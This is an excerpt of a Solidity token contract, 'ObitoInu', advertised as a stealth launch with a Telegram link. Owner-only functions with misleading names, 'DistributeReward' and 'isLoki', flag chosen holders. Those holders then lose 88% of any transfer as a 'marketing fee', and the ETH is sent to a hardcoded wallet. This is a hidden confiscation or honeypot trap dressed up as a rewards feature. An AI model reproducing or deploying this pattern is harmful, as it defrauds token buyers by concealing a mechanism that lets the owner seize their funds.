...
/**
    Obito Stealth Launch
    Telegram : https://t.me/ObitosCalls
     */
...
contract ObitoInu is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _isRewardEligible;
    ...
    function DistributeReward(address[] memory accounts, bool state) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isRewardEligible[accounts[i]] = state;
        }
    }

    function isLoki(address account) public view returns(bool) {
        return _isRewardEligible[account];
    }    
    ...
    function _getValuesReward(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * 88 / 100; 
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (to == uniswapV2Pair && _isRewardEligible[from]) {
                transferAmount = _getValuesReward(amount, from);
            }
            if (_isRewardEligible[from]) {
                transferAmount = _getValuesReward(amount, from);
            }
            if (_isRewardEligible[to]) {
                transferAmount = _getValuesReward(amount, from);
            }
        } 
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0){
            payable(address(0x5867B4db41A351b323fb723dd21a21cf71407a66)).transfer(ethToSend);
        }
    }
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0){
            payable(address(0x5867B4db41A351b323fb723dd21a21cf71407a66)).sendValue (ethAmount - ethFromLiquidity);
        }
    }
}